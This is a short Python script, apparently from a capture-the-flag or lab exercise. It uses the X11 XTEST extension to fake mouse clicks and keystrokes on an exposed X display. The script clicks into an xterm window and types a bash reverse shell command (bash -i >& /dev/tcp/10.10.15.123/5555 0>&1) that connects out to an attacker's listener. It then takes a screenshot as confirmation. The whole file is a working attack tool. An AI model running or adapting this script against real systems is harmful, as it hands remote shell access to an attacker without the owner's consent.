import os, time
os.environ['DISPLAY'] = ':0'
from Xlib import display, X
from Xlib.ext import xtest
import subprocess

d = display.Display(':0')

def click_coords(cx, cy):
    xtest.fake_input(d, X.MotionNotify, x=cx, y=cy)
    d.sync()
    time.sleep(0.05)
    xtest.fake_input(d, X.ButtonPress, 1)
    d.sync()
    time.sleep(0.05)
    xtest.fake_input(d, X.ButtonRelease, 1)
    d.sync()

def type_string(text):
    shift_chars = {
        ':': ';', '?': '/', '"': "'", '+': '=', '_': '-',
        '{': '[', '}': ']', '|': '\\', '<': ',', '>': '.',
        '~': '`', '!': '1', '@': '2', '#': '3', '$': '4',
        '%': '5', '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
    }
    shift_keysym = 0xffe1
    shift_keycode = d.keysym_to_keycode(shift_keysym)
    for char in text:
        needs_shift = char.isupper() or char in shift_chars
        actual_char = shift_chars.get(char, char)
        keysym = ord(actual_char)
        keycode = d.keysym_to_keycode(keysym)
        if needs_shift:
            xtest.fake_input(d, X.KeyPress, shift_keycode)
            d.sync(); time.sleep(0.02)
        xtest.fake_input(d, X.KeyPress, keycode)
        d.sync(); time.sleep(0.02)
        xtest.fake_input(d, X.KeyRelease, keycode)
        d.sync(); time.sleep(0.02)
        if needs_shift:
            xtest.fake_input(d, X.KeyRelease, shift_keycode)
            d.sync(); time.sleep(0.02)

# 1. Click inside the xterm window to ensure it has focus
print("[1] Clicking into xterm...")
click_coords(227,27)
time.sleep(0.3)

# 2. Type the reverse shell command
print("[2] Typing payload...")
type_string("bash -i >& /dev/tcp/10.10.15.123/5555 0>&1")
time.sleep(0.3)

# 3. Press Enter
print("[3] Pressing Enter...")
return_keycode = d.keysym_to_keycode(0xff0d)  # Return
xtest.fake_input(d, X.KeyPress, return_keycode)
d.sync(); time.sleep(0.05)
xtest.fake_input(d, X.KeyRelease, return_keycode)
d.sync()

time.sleep(0.5)
subprocess.run(["scrot", "/tmp/xterm_shell_result.png"])
d.close()
print("Done. Check your listener and /tmp/xterm_shell_result.png")
